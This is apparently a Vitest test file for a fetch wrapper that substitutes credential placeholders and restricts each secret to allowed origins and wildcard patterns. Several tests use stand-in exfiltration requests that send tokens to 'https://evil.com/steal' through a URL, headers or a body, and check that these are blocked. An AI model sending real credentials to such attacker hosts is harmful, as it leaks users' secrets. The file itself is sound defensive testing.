import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  substitutePlaceholders,
  createCredentialFetch,
  type SecretMapEntry,
} from './credential-fetch';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeSecrets(
  entries: [string, string, string[]][],
): Map<string, SecretMapEntry> {
  const map = new Map<string, SecretMapEntry>();
  for (const [placeholder, value, allowedOrigins] of entries) {
    map.set(placeholder, { value, allowedOrigins });
  }
  return map;
}

function flatValues(
  entries: [string, string, string[]][],
): Map<string, string> {
  const map = new Map<string, string>();
  for (const [placeholder, value] of entries) {
    map.set(placeholder, value);
  }
  return map;
}

const TOKEN_PLACEHOLDER = '{{CRED:figma-pat:token:a1b2c3}}';
const TOKEN_REAL = 'figd_real_secret_123';
const FIGMA_ORIGINS = ['https://api.figma.com'];

const REFRESH_PLACEHOLDER = '{{CRED:figma-oauth:refresh:d4e5f6}}';
const REFRESH_REAL = 'rt_super_secret_456';
const REFRESH_ORIGINS = ['https://api.figma.com'];

function defaultEntries(): [string, string, string[]][] {
  return [
    [TOKEN_PLACEHOLDER, TOKEN_REAL, FIGMA_ORIGINS],
    [REFRESH_PLACEHOLDER, REFRESH_REAL, REFRESH_ORIGINS],
  ];
}

function defaultSecrets() {
  return makeSecrets(defaultEntries());
}

// ---------------------------------------------------------------------------
// substitutePlaceholders
// ---------------------------------------------------------------------------

describe('substitutePlaceholders', () => {
  it('replaces a single placeholder', () => {
    const result = substitutePlaceholders(
      `Bearer ${TOKEN_PLACEHOLDER}`,
      flatValues(defaultEntries()),
    );
    expect(result).toBe(`Bearer ${TOKEN_REAL}`);
  });

  it('replaces multiple different placeholders', () => {
    const input = `token=${TOKEN_PLACEHOLDER}&refresh=${REFRESH_PLACEHOLDER}`;
    const result = substitutePlaceholders(input, flatValues(defaultEntries()));
    expect(result).toBe(`token=${TOKEN_REAL}&refresh=${REFRESH_REAL}`);
  });

  it('replaces the same placeholder appearing twice', () => {
    const input = `${TOKEN_PLACEHOLDER}:${TOKEN_PLACEHOLDER}`;
    const result = substitutePlaceholders(input, flatValues(defaultEntries()));
    expect(result).toBe(`${TOKEN_REAL}:${TOKEN_REAL}`);
  });

  it('returns the string unchanged when no placeholders are present', () => {
    const input = 'https://api.example.com/v1/me';
    expect(substitutePlaceholders(input, flatValues(defaultEntries()))).toBe(
      input,
    );
  });

  it('leaves unrecognised placeholders as-is', () => {
    const unknown = '{{CRED:unknown:field:000000}}';
    const result = substitutePlaceholders(
      unknown,
      flatValues(defaultEntries()),
    );
    expect(result).toBe(unknown);
  });

  it('returns empty string unchanged', () => {
    expect(substitutePlaceholders('', flatValues(defaultEntries()))).toBe('');
  });

  it('returns input unchanged when secret map is empty', () => {
    const input = `Bearer ${TOKEN_PLACEHOLDER}`;
    expect(substitutePlaceholders(input, new Map())).toBe(input);
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Allowed origin: URL substitution
// ---------------------------------------------------------------------------

describe('createCredentialFetch — URL substitution (allowed origin)', () => {
  let mockFetch: ReturnType<typeof vi.fn>;
  let proxied: typeof globalThis.fetch;

  beforeEach(() => {
    mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
  });

  it('replaces placeholder in URL path', async () => {
    await proxied(`https://api.figma.com/${TOKEN_PLACEHOLDER}/data`);
    expect(mockFetch).toHaveBeenCalledWith(
      `https://api.figma.com/${TOKEN_REAL}/data`,
      expect.objectContaining({ redirect: 'manual' }),
    );
  });

  it('replaces placeholder in URL query parameter', async () => {
    await proxied(`https://api.figma.com/v1?token=${TOKEN_PLACEHOLDER}`);
    expect(mockFetch).toHaveBeenCalledWith(
      `https://api.figma.com/v1?token=${TOKEN_REAL}`,
      expect.objectContaining({ redirect: 'manual' }),
    );
  });

  it('replaces multiple placeholders in URL', async () => {
    await proxied(
      `https://api.figma.com?a=${TOKEN_PLACEHOLDER}&b=${REFRESH_PLACEHOLDER}`,
    );
    expect(mockFetch).toHaveBeenCalledWith(
      `https://api.figma.com?a=${TOKEN_REAL}&b=${REFRESH_REAL}`,
      expect.objectContaining({ redirect: 'manual' }),
    );
  });

  it('handles URL objects', async () => {
    const url = new URL(`https://api.figma.com/v1?token=${TOKEN_PLACEHOLDER}`);
    await proxied(url);
    expect(mockFetch).toHaveBeenCalledWith(
      `https://api.figma.com/v1?token=${TOKEN_REAL}`,
      expect.objectContaining({ redirect: 'manual' }),
    );
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Header substitution (allowed origin)
// ---------------------------------------------------------------------------

describe('createCredentialFetch — Header substitution (allowed origin)', () => {
  let mockFetch: ReturnType<typeof vi.fn>;
  let proxied: typeof globalThis.fetch;

  beforeEach(() => {
    mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
  });

  it('substitutes in plain object headers', async () => {
    await proxied('https://api.figma.com', {
      headers: { Authorization: `Bearer ${TOKEN_PLACEHOLDER}` },
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect((init.headers as Record<string, string>).Authorization).toBe(
      `Bearer ${TOKEN_REAL}`,
    );
  });

  it('substitutes in Headers instance', async () => {
    const headers = new Headers();
    headers.set('X-Token', TOKEN_PLACEHOLDER);
    await proxied('https://api.figma.com', { headers });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    const replaced = init.headers as Headers;
    expect(replaced.get('X-Token')).toBe(TOKEN_REAL);
  });

  it('substitutes in array-of-tuples headers', async () => {
    const headers: [string, string][] = [
      ['X-Token', TOKEN_PLACEHOLDER],
      ['X-Refresh', REFRESH_PLACEHOLDER],
    ];
    await proxied('https://api.figma.com', { headers });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    const replaced = init.headers as [string, string][];
    expect(replaced[0][1]).toBe(TOKEN_REAL);
    expect(replaced[1][1]).toBe(REFRESH_REAL);
  });

  it('does not substitute header names', async () => {
    await proxied('https://api.figma.com', {
      headers: { [TOKEN_PLACEHOLDER]: 'some-value' },
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    const keys = Object.keys(init.headers as Record<string, string>);
    expect(keys).toContain(TOKEN_PLACEHOLDER);
  });

  it('substitutes in multiple headers simultaneously', async () => {
    await proxied('https://api.figma.com', {
      headers: {
        Authorization: `Bearer ${TOKEN_PLACEHOLDER}`,
        'X-Refresh': REFRESH_PLACEHOLDER,
        'Content-Type': 'application/json',
      },
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    const h = init.headers as Record<string, string>;
    expect(h.Authorization).toBe(`Bearer ${TOKEN_REAL}`);
    expect(h['X-Refresh']).toBe(REFRESH_REAL);
    expect(h['Content-Type']).toBe('application/json');
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Body substitution (allowed origin)
// ---------------------------------------------------------------------------

describe('createCredentialFetch — Body substitution (allowed origin)', () => {
  let mockFetch: ReturnType<typeof vi.fn>;
  let proxied: typeof globalThis.fetch;

  beforeEach(() => {
    mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
  });

  it('substitutes in JSON string body', async () => {
    const body = JSON.stringify({ token: TOKEN_PLACEHOLDER });
    await proxied('https://api.figma.com', {
      method: 'POST',
      body,
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(JSON.parse(init.body as string).token).toBe(TOKEN_REAL);
  });

  it('substitutes in URL-encoded form body', async () => {
    const body = `grant_type=refresh_token&refresh_token=${REFRESH_PLACEHOLDER}`;
    await proxied('https://api.figma.com/token', {
      method: 'POST',
      body,
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.body).toBe(
      `grant_type=refresh_token&refresh_token=${REFRESH_REAL}`,
    );
  });

  it('passes ArrayBuffer body through unchanged', async () => {
    const buf = new ArrayBuffer(8);
    await proxied('https://api.figma.com', {
      method: 'POST',
      body: buf,
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.body).toBe(buf);
  });

  it('handles null body without error', async () => {
    await proxied('https://api.figma.com', { body: null });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.body).toBeNull();
  });

  it('handles undefined body without error', async () => {
    await proxied('https://api.figma.com', {});
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.body).toBeUndefined();
  });

  it('passes FormData body through unchanged', async () => {
    const fd = new FormData();
    fd.set('key', 'value');
    await proxied('https://api.figma.com', {
      method: 'POST',
      body: fd,
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.body).toBe(fd);
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Request object as first arg (allowed origin)
// ---------------------------------------------------------------------------

describe('createCredentialFetch — Request-like first arg (allowed origin)', () => {
  let mockFetch: ReturnType<typeof vi.fn>;
  let proxied: typeof globalThis.fetch;

  beforeEach(() => {
    mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
  });

  it('substitutes URL and headers in a duck-typed Request-like object', async () => {
    const reqLike = {
      url: `https://api.figma.com?t=${TOKEN_PLACEHOLDER}`,
      headers: new Headers({ 'X-Token': TOKEN_PLACEHOLDER }),
      method: 'GET',
      body: null,
      signal: undefined,
      redirect: 'follow' as RequestRedirect,
      referrer: '',
    };
    await proxied(reqLike as unknown as Request);
    const [calledUrl, calledInit] = mockFetch.mock.calls[0];
    expect(calledUrl).toBe(`https://api.figma.com?t=${TOKEN_REAL}`);
    expect(
      (calledInit as RequestInit).headers instanceof Headers
        ? (calledInit as RequestInit & { headers: Headers }).headers.get(
            'X-Token',
          )
        : undefined,
    ).toBe(TOKEN_REAL);
  });

  it('preserves method and redirect is forced to manual', async () => {
    const reqLike = {
      url: `https://api.figma.com?t=${TOKEN_PLACEHOLDER}`,
      headers: new Headers(),
      method: 'DELETE',
      body: null,
      signal: undefined,
      redirect: 'follow' as RequestRedirect,
      referrer: 'https://example.com',
    };
    await proxied(reqLike as unknown as Request);
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.method).toBe('DELETE');
    expect(init.redirect).toBe('manual');
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Origin restriction (BLOCKED)
// ---------------------------------------------------------------------------

describe('createCredentialFetch — Origin restriction', () => {
  let mockFetch: ReturnType<typeof vi.fn>;
  let proxied: typeof globalThis.fetch;

  beforeEach(() => {
    mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
  });

  it('throws when credential placeholder is sent to a disallowed origin (URL)', async () => {
    await expect(
      proxied(`https://evil.com/steal?t=${TOKEN_PLACEHOLDER}`),
    ).rejects.toThrow(/not allowed to be sent to https:\/\/evil\.com/);
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('throws when credential placeholder is in headers targeting a disallowed origin', async () => {
    await expect(
      proxied('https://evil.com/api', {
        headers: { Authorization: `Bearer ${TOKEN_PLACEHOLDER}` },
      }),
    ).rejects.toThrow(/not allowed to be sent to https:\/\/evil\.com/);
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('throws when credential placeholder is in body targeting a disallowed origin', async () => {
    await expect(
      proxied('https://evil.com/api', {
        method: 'POST',
        body: JSON.stringify({ token: TOKEN_PLACEHOLDER }),
      }),
    ).rejects.toThrow(/not allowed to be sent to https:\/\/evil\.com/);
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('error message includes the credential type ID', async () => {
    await expect(
      proxied(`https://evil.com/${TOKEN_PLACEHOLDER}`),
    ).rejects.toThrow(/figma-pat/);
  });

  it('error message includes the allowed origins', async () => {
    await expect(
      proxied(`https://evil.com/${TOKEN_PLACEHOLDER}`),
    ).rejects.toThrow(/https:\/\/api\.figma\.com/);
  });

  it('allows requests without placeholders to any origin', async () => {
    await proxied('https://evil.com/safe');
    expect(mockFetch).toHaveBeenCalledWith('https://evil.com/safe', undefined);
  });

  it('blocks when credentials from different types target an origin only one allows', async () => {
    const mixed = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://api.figma.com']],
      [
        '{{CRED:google-ai-key:apiKey:aabbcc}}',
        'AIza_key',
        ['https://generativelanguage.googleapis.com'],
      ],
    ]);
    const proxy = createCredentialFetch(mockFetch, () => mixed);
    await expect(
      proxy(
        `https://api.figma.com/v1?key={{CRED:google-ai-key:apiKey:aabbcc}}`,
      ),
    ).rejects.toThrow(/google-ai-key/);
    expect(mockFetch).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Wildcard origin patterns
// ---------------------------------------------------------------------------

describe('createCredentialFetch — Wildcard origin patterns', () => {
  let mockFetch: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
  });

  it('allows a request matching a single-segment wildcard subdomain', async () => {
    const secrets = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://*.supabase.co']],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    await proxied(
      `https://myproject.supabase.co/rest/v1?t=${TOKEN_PLACEHOLDER}`,
    );
    expect(mockFetch).toHaveBeenCalled();
    expect(mockFetch.mock.calls[0][0]).toBe(
      `https://myproject.supabase.co/rest/v1?t=${TOKEN_REAL}`,
    );
  });

  it('allows a request matching a wildcard deeper in the host', async () => {
    const secrets = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://*.api.example.com']],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    await proxied(`https://us1.api.example.com/v1?t=${TOKEN_PLACEHOLDER}`);
    expect(mockFetch).toHaveBeenCalled();
  });

  it('rejects when wildcard segment count does not match', async () => {
    const secrets = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://*.supabase.co']],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    // sub.sub.supabase.co has 4 segments, pattern has 3 → no match
    await expect(
      proxied(`https://sub.sub.supabase.co/v1?t=${TOKEN_PLACEHOLDER}`),
    ).rejects.toThrow(/not allowed to be sent to/);
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('rejects when scheme differs', async () => {
    const secrets = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://*.example.com']],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    await expect(
      proxied(`http://api.example.com/v1?t=${TOKEN_PLACEHOLDER}`),
    ).rejects.toThrow(/not allowed to be sent to/);
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('rejects when non-wildcard segments differ', async () => {
    const secrets = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://*.supabase.co']],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    await expect(
      proxied(`https://proj.evil.co/v1?t=${TOKEN_PLACEHOLDER}`),
    ).rejects.toThrow(/not allowed to be sent to/);
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('still allows exact matches alongside wildcard patterns', async () => {
    const secrets = makeSecrets([
      [
        TOKEN_PLACEHOLDER,
        TOKEN_REAL,
        ['https://api.figma.com', 'https://*.figma.com'],
      ],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    await proxied(`https://api.figma.com/v1?t=${TOKEN_PLACEHOLDER}`);
    expect(mockFetch).toHaveBeenCalled();
  });

  it('matches wildcard with port in pattern', async () => {
    const secrets = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://*.example.com:8443']],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    await proxied(`https://api.example.com:8443/v1?t=${TOKEN_PLACEHOLDER}`);
    expect(mockFetch).toHaveBeenCalled();
  });

  it('rejects when port does not match', async () => {
    const secrets = makeSecrets([
      [TOKEN_PLACEHOLDER, TOKEN_REAL, ['https://*.example.com:8443']],
    ]);
    const proxied = createCredentialFetch(mockFetch, () => secrets);
    await expect(
      proxied(`https://api.example.com:9999/v1?t=${TOKEN_PLACEHOLDER}`),
    ).rejects.toThrow(/not allowed to be sent to/);
    expect(mockFetch).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Redirect safety
// ---------------------------------------------------------------------------

describe('createCredentialFetch — Redirect safety', () => {
  let mockFetch: ReturnType<typeof vi.fn>;
  let proxied: typeof globalThis.fetch;

  beforeEach(() => {
    mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
  });

  it('forces redirect: manual when credentials are present', async () => {
    await proxied(`https://api.figma.com/v1?t=${TOKEN_PLACEHOLDER}`);
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.redirect).toBe('manual');
  });

  it('overrides explicit redirect: follow when credentials are present', async () => {
    await proxied(`https://api.figma.com/v1?t=${TOKEN_PLACEHOLDER}`, {
      redirect: 'follow',
    });
    const init = mockFetch.mock.calls[0][1] as RequestInit;
    expect(init.redirect).toBe('manual');
  });

  it('does not force redirect: manual when no credentials are used', async () => {
    await proxied('https://api.figma.com/public');
    expect(mockFetch).toHaveBeenCalledWith(
      'https://api.figma.com/public',
      undefined,
    );
  });
});

// ---------------------------------------------------------------------------
// createCredentialFetch — Edge cases
// ---------------------------------------------------------------------------

describe('createCredentialFetch — Edge cases', () => {
  it('delegates directly when secret map is empty (fast path)', async () => {
    const mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    const proxied = createCredentialFetch(mockFetch, () => new Map());
    const url = `https://api.figma.com?token=${TOKEN_PLACEHOLDER}`;
    await proxied(url);
    expect(mockFetch).toHaveBeenCalledWith(url, undefined);
  });

  it('picks up secrets added after proxy creation (lazy getter)', async () => {
    const secrets = new Map<string, SecretMapEntry>();
    const mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    const proxied = createCredentialFetch(mockFetch, () => secrets);

    await proxied(`https://api.figma.com?t=${TOKEN_PLACEHOLDER}`);
    expect(mockFetch.mock.calls[0][0]).toBe(
      `https://api.figma.com?t=${TOKEN_PLACEHOLDER}`,
    );

    secrets.set(TOKEN_PLACEHOLDER, {
      value: TOKEN_REAL,
      allowedOrigins: FIGMA_ORIGINS,
    });

    await proxied(`https://api.figma.com?t=${TOKEN_PLACEHOLDER}`);
    expect(mockFetch.mock.calls[1][0]).toBe(
      `https://api.figma.com?t=${TOKEN_REAL}`,
    );
  });

  it('returns the response from the real fetch unchanged', async () => {
    const response = new Response('secret-data', { status: 200 });
    const mockFetch = vi.fn().mockResolvedValue(response);
    const proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
    const result = await proxied('https://api.figma.com');
    expect(result).toBe(response);
  });

  it('works with fetch called with only a URL string (no init)', async () => {
    const mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    const proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
    await proxied('https://api.figma.com/plain');
    expect(mockFetch).toHaveBeenCalledWith(
      'https://api.figma.com/plain',
      undefined,
    );
  });

  it('substitutes in both URL and init simultaneously', async () => {
    const mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    const proxied = createCredentialFetch(mockFetch, () => defaultSecrets());
    await proxied(`https://api.figma.com?t=${TOKEN_PLACEHOLDER}`, {
      headers: { Authorization: `Bearer ${REFRESH_PLACEHOLDER}` },
      method: 'POST',
      body: JSON.stringify({ key: TOKEN_PLACEHOLDER }),
    });
    const [calledUrl, calledInit] = mockFetch.mock.calls[0];
    expect(calledUrl).toBe(`https://api.figma.com?t=${TOKEN_REAL}`);
    const init = calledInit as RequestInit;
    expect((init.headers as Record<string, string>).Authorization).toBe(
      `Bearer ${REFRESH_REAL}`,
    );
    expect(JSON.parse(init.body as string).key).toBe(TOKEN_REAL);
  });
});
